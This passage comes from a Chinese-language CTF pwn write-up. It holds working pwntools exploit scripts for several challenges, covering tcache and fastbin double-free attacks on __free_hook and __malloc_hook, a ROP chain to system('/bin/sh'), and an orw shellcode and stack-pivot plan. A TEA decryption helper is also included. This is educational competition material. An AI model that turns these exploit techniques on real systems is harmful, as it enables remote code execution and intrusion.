class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>, <span class=\"number\">11009</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;, &#x27;./chall&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choice &gt;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Content: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena = <span class=\"number\">0x000003EBC40</span> </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(i, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    free(<span class=\"number\">7</span>-i)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>) <span class=\"comment\"># 泄露main_arana地址</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">inp = u64(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">libc_base = inp-<span class=\"number\">96</span>-main_arena</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f3d5</span>,<span class=\"number\">0x4f432</span>,<span class=\"number\">0x10a41c</span>] <span class=\"comment\"># one gadget</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>])) <span class=\"comment\"># 修改fd指针为__free_hook地址</span></span><br><span class=\"line\">add(<span class=\"number\">10</span>, <span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>, <span class=\"number\">0x90</span>) <span class=\"comment\"># 11号堆块在__free_hook位置</span></span><br><span class=\"line\">edit(<span class=\"number\">11</span>, p64(ogg[<span class=\"number\">1</span>]+libc_base)) <span class=\"comment\"># 在__free_hook位置写入one gadget</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\"># add(12, 0x90)</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># 除法free函数，执行ogg</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>具体利用方法见<a href=\"https://blog.csdn.net/A951860555/article/details/115442780?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link\">CTF pwn题堆入门 – Tcache bin_lifanxin的博客-CSDN博客</a></p>\n<h1 id=\"BasicMath\"><a href=\"#BasicMath\" class=\"headerlink\" title=\"BasicMath\"></a>BasicMath</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126234339793.png\" alt=\"image-20211126234339793\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234403168.png\" alt=\"image-20211126234403168\"></p>\n<p>又有随机数，但这一次需要预测，直接利用python eval()计算结果就行，注意到有16个问题，当i&#x3D;&#x3D;15是，会进入last_problem函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234530108.png\" alt=\"image-20211126234530108\"></p>\n<p>貌似没有什么问题</p>\n<p>再仔细观察就会发现，readint返回的是64位有符号整型数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234625584.png\" alt=\"image-20211126234625584\"></p>\n<p>但进行校验的时候，取得是v5得高32位字节判断，所以只需要最后一次输入的数比较大就行</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126234633993.png\" alt=\"image-20211126234633993\"></p>\n<p>然后就是进入gift函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235123293.png\" alt=\"image-20211126235123293\"></p>\n<p>发现有leak和溢出漏洞</p>\n<h2 id=\"Exp-3\"><a href=\"#Exp-3\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>,<span class=\"number\">10874</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./chall&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &#x27;./libc-2.27.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;]&#x27;</span>)</span><br><span class=\"line\">    inp = io.recvuntil(<span class=\"string\">&#x27; = ?&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    ans = <span class=\"built_in\">eval</span>(inp)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(ans))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27; = ?&#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&#x27;11111111111111&#x27;</span>)</span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f3d5</span>,<span class=\"number\">0x4f432</span>,<span class=\"number\">0x10a41c</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> io.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">canary = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) <span class=\"comment\"># 泄露canary</span></span><br><span class=\"line\">stack = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) <span class=\"comment\"># 泄露栈地址</span></span><br><span class=\"line\">func_base = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">0x000000000000168A</span> <span class=\"comment\"># 泄露函数加载地址</span></span><br><span class=\"line\">io.recv(<span class=\"number\">8</span> * <span class=\"number\">5</span>)</span><br><span class=\"line\">libc_base = u64(io.recv(<span class=\"number\">8</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">231</span> - libc.sym[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>] <span class=\"comment\"># 泄露libc基址</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(canary)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(func_base)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc_base)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000001713</span> + func_base</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">p = p64(canary) + p64(<span class=\"number\">0</span>) + p64(pop_rdi+<span class=\"number\">1</span>) + p64(pop_rdi) + p64(stack) + p64(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]) + p64(<span class=\"number\">0xdeadbeaf</span>) + <span class=\"string\">&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">io.send(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"easyheap\"><a href=\"#easyheap\" class=\"headerlink\" title=\"easyheap\"></a>easyheap</h1><p><img src=\"/p/xp0intCTF-wp/image-20211126235844561.png\" alt=\"image-20211126235844561\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235859619.png\" alt=\"image-20211126235859619\"></p>\n<p>又是堆题，libc版本2.23没有tcache</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235945221.png\" alt=\"image-20211126235945221\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211126235953460.png\" alt=\"image-20211126235953460\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000000431.png\" alt=\"image-20211127000000431\"></p>\n<p>似曾相识的tea，这个题目构造貌似在那里见过？（难道是那个某省的第一届攻防大赛？）</p>\n<h2 id=\"tea解密\"><a href=\"#tea解密\" class=\"headerlink\" title=\"tea解密\"></a>tea解密</h2><p>本地写一个c10udlnk教我的tea解密脚本</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">decrypt</span> <span class=\"params\">(<span class=\"type\">uint32_t</span>* v, <span class=\"type\">uint32_t</span>* k, <span class=\"type\">uint32_t</span> delta)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> v0=v[<span class=\"number\">0</span>], v1=v[<span class=\"number\">1</span>], sum=delta*<span class=\"number\">32</span>, i;  <span class=\"comment\">/* set up */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> k0=k[<span class=\"number\">0</span>], k1=k[<span class=\"number\">1</span>], k2=k[<span class=\"number\">2</span>], k3=k[<span class=\"number\">3</span>];   <span class=\"comment\">/* cache key */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">32</span>; i++) &#123;                         <span class=\"comment\">/* basic cycle start */</span></span><br><span class=\"line\">        v1 -= ((v0&lt;&lt;<span class=\"number\">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class=\"number\">5</span>) + k3);</span><br><span class=\"line\">        v0 -= ((v1&lt;&lt;<span class=\"number\">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class=\"number\">5</span>) + k1);</span><br><span class=\"line\">        sum -= delta;</span><br><span class=\"line\">    &#125;                                              <span class=\"comment\">/* end cycle */</span></span><br><span class=\"line\">    v[<span class=\"number\">0</span>]=v0; </span><br><span class=\"line\">    v[<span class=\"number\">1</span>]=v1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> k[<span class=\"number\">4</span>];</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> del;</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>((<span class=\"type\">char</span>*)k, <span class=\"string\">&quot;ggslggyzgghysdyy&quot;</span>, <span class=\"keyword\">sizeof</span>(k));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%x %x %u&quot;</span>, &amp;c[<span class=\"number\">0</span>], &amp;c[<span class=\"number\">1</span>], &amp;del);</span><br><span class=\"line\">    decrypt(c, k, del);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x %x\\n&quot;</span>, c[<span class=\"number\">0</span>], c[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h2><p>free函数</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000428499.png\" alt=\"image-20211127000428499\"></p>\n<p>清零过程</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000437945.png\" alt=\"image-20211127000437945\"></p>\n<p>会发现第15个块，会被free但不会清零</p>\n<p>之后就是fastbin的double free攻击</p>\n<h2 id=\"Exp-4\"><a href=\"#Exp-4\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tea</span>(<span class=\"params\">c1, c2, de</span>):</span><br><span class=\"line\">    c1 = <span class=\"built_in\">hex</span>(c1)</span><br><span class=\"line\">    c2 = <span class=\"built_in\">hex</span>(c2)</span><br><span class=\"line\">    teaio = process(<span class=\"string\">&#x27;./tea&#x27;</span>)</span><br><span class=\"line\">    teaio.sendline(c1 + <span class=\"string\">&#x27; &#x27;</span> + c2 + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">str</span>(de))</span><br><span class=\"line\">    r = teaio.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(r[<span class=\"number\">0</span>], <span class=\"number\">16</span>), <span class=\"built_in\">int</span>(r[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;35.229.138.83&#x27;</span>,<span class=\"number\">11967</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.23.so&#x27;,&#x27;./pwn&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so&#x27;&#125;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Your secret key: &#x27;</span>)</span><br><span class=\"line\">d = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;My gift: &#x27;</span>)</span><br><span class=\"line\">s = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>).split(<span class=\"string\">&#x27;,&#x27;</span>)</span><br><span class=\"line\">cc0, cc1 = <span class=\"built_in\">int</span>(s[<span class=\"number\">0</span>], <span class=\"number\">16</span>), <span class=\"built_in\">int</span>(s[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">p0, p1 = tea(cc0, cc1, d)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;Your gift: &#x27;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"built_in\">str</span>(p0) + <span class=\"string\">&#x27;,&#x27;</span> + <span class=\"built_in\">str</span>(p1))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx, size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;id: &#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;content: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1638&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Your gift: &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf03a4</span>,<span class=\"number\">0xf1247</span>]</span><br><span class=\"line\">libc.address = show() - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libc.address)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">15</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">13</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 13位置地址 == 15位置地址</span></span><br><span class=\"line\">add(<span class=\"number\">14</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 中间有一个绕过double free检查</span></span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x60</span>, p64(libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">19</span> + p64(libc.address + ogg[<span class=\"number\">3</span>]))</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;choice &gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;id: &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;size: &#x27;</span>, <span class=\"string\">&#x27;20&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># free()</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>fastbin double free利用方法见<a href=\"https://blog.csdn.net/A951860555/article/details/115496056\">CTF pwn题堆入门 – Fast bin_lifanxin的博客-CSDN博客</a></p>\n<h1 id=\"gift\"><a href=\"#gift\" class=\"headerlink\" title=\"gift\"></a>gift</h1><p><img src=\"/p/xp0intCTF-wp/image-20211127000816797.png\" alt=\"image-20211127000816797\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000919468.png\" alt=\"image-20211127000919468\"></p>\n<p>发现沙盒使用seccomp-tools，查看发现execve函数被禁用了，也就是说不能调用system、shellcode getshell这些getshell，解决方法orw（open、read、write），原理就是open打开本地文件，read读取进入内存，write打印到屏幕</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127000958031.png\" alt=\"image-20211127000958031\"></p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127001150997.png\" alt=\"image-20211127001150997\"></p>\n<p>gift函数发现有一个格式化字符串漏洞，可以泄露栈地址、libc地址和函数加载地址</p>\n<p><img src=\"/p/xp0intCTF-wp/image-20211127001405741.png\" alt=\"image-20211127001405741\"></p>\n<p>main函数发现有一个栈溢出的漏洞，但只能覆盖返回地址，不能直接构造ROP，但发现name在bss段，可以先在name函数中布置rop，然后利用两次leave;retn劫持rsp，实现栈迁移到bss，执行在name中构造的rop</p>\n<h2 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h2><p>rop思路首先需要实现orw，需要编写shellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">3</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x00002020cf</span> + elf.address, <span class=\"number\">0x30</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后需要调用libc中的mprotect函数，将bss段权限改为可读可写可执行，最后跳转到shellcode上</p>\n<h2 id=\"Exp-5\"><a href=\"#Exp-5\" class=\"headerlink\" title=\"Exp\"></a>Exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span 